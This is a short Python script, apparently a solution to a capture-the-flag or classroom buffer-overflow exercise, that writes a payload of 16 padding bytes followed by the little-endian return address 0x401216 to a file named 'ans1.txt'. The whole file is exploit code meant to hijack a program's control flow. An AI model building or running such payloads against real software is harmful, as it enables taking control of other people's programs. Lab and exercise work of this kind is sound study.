import sys

padding_len = 16 
padding = b"A" * padding_len

target_address = (0x401216).to_bytes(8, byteorder='little')

payload = padding + target_address


with open("ans1.txt", "wb") as f:
    f.write(payload)
